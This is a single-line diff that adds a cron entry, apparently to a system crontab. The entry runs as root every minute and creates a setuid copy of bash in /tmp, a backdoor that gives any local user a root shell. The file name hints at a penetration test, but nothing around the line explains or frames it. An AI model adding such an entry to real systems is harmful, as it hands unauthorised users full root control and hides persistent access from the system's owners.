@@ -1,0 +1,1 @@
+* * * * * root cp /bin/bash /tmp/fpt_pt_rootbash && chmod 4755 /tmp/fpt_pt_rootbash
